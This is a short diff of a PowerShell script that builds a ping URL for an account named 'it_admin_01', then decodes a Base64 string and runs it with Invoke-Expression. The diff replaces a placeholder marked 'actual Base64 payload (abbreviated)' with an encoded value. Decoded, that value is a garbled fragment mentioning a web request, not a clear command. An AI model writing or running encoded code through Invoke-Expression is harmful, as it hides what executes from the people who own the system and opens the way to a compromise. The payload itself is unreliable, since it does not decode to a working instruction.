@@ -5,7 +5,7 @@ $account="it_admin_01";
 
 $ping="http://auth-check.intra-sec.local/api/ping?user=$account";
 
-$e="SQBkAHcAIAAkAHA...==";   # 실제 Base64 payload (축약)
+$e="SQBkAHcAIAAkAHUAIABJAG4AdgBvAGsAZQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="
 $bytes=[System.Convert]::FromBase64String($e);
 
 Invoke-Expression([System.Text.Encoding]::Unicode.GetString($bytes));
